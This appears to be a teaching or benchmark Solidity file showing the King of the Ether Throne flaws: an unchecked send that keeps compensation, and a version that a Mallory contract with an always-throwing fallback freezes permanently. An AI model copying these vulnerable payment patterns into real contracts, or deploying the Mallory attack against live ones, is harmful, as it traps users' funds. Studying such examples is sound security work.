// Contract KotET does not check return code for send function.
// Hence, since send function is equipped with a few gas, the send at line 20
// will fail if the king’s address is that of a contract with an expensive
// fallback. In this case, since send does not propagate exceptions, the
// compensation is kept by the contract.

contract KotET {
  address public king;
  uint public claimPrice = 100;
  address owner;

  function KotET() {
    owner = msg.sender;
    king = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function sweepCommission(uint amount)  {
    owner.send(amount);
  }

  function() {
    if (msg.value < claimPrice) throw;

    uint compensation = calculateCompensation();
    king.send(compensation);
    king = msg.sender;
    claimPrice = calculateNewPrice();
  }

  function calculateCompensation() private returns(uint) {
    return claimPrice+100;
  }

  function calculateNewPrice() private returns(uint) {
    return msg.value+100;
  }
}

// Contract KotET2 does check return code for send function but is vulnerable to
// get stuck. The attack works as follows: (1) deploy KotET2 providing at least
// 1ether at creation time; (2) let others play along; (3) deploy Mallory
// contract; (4) invoke Mallory’s unseatKing function to secure the King’s
// throne forever.

contract KotET2 {
  address public king;
  uint public claimPrice = 100;
  address owner;

  function KotET2() {
    owner = msg.sender;
    king = msg.sender;
    if (msg.value<1 ether) throw;
  }

  function sweepCommission(uint amount)  {
    owner.send(amount);
  }

  function() {
    if (msg.value < claimPrice) throw;

    uint compensation = calculateCompensation();
    if (!king.call.value(compensation)()) throw;
    king = msg.sender;
    claimPrice = calculateNewPrice();
  }

  function calculateCompensation() private returns(uint) {
    return claimPrice+100;
  }

    function calculateNewPrice() private returns(uint) {
    return msg.value+100;
  }
}

contract Bob {
  uint public count;

  function unseatKing(address king, uint w){
    king.call.value(w)();
  }

  function() {
    count++;
  }
}

contract Mallory {

  function unseatKing(address king, uint w){
    king.call.value(w)();
  }

  function() {
    throw;
  }
}
